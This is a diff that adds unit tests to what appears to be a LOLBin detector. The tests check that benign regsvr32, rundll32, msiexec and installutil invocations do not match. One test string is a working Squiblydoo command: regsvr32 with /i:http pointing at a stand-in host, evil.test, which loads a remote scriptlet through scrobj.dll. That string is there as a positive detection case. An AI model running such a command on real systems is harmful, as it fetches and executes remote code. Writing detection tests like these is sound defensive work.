@@ -49,3 +49,23 @@ describe('finger LOLBin', () => {
     expect(r.hit).toBe(false)
   })
 })
+
+const ctxFor = (s: string) => buildContext(s, [], 'unknown')
+
+describe('LOLBin benign-twin discipline (review 2.3)', () => {
+  it('benign regsvr32 /u /s <local dll> does NOT match', () => {
+    expect(matchLolbin(ctxFor('regsvr32 /u /s C:\\Program Files\\MyApp\\shell-extension.dll')).hit).toBe(false)
+  })
+  it('real Squiblydoo (regsvr32 /i:http scrobj) still matches', () => {
+    expect(matchLolbin(ctxFor('regsvr32 /s /n /u /i:http://evil.test/a.sct scrobj.dll')).hit).toBe(true)
+  })
+  it('benign rundll32 shell32.dll,Control_RunDLL does NOT match', () => {
+    expect(matchLolbin(ctxFor('rundll32.exe shell32.dll,Control_RunDLL')).hit).toBe(false)
+  })
+  it('benign msiexec /i app.msi /qn does NOT match', () => {
+    expect(matchLolbin(ctxFor('msiexec /i app.msi /qn')).hit).toBe(false)
+  })
+  it('benign installutil app.exe does NOT match', () => {
+    expect(matchLolbin(ctxFor('installutil /u C:\\app\\thing.exe')).hit).toBe(false)
+  })
+})
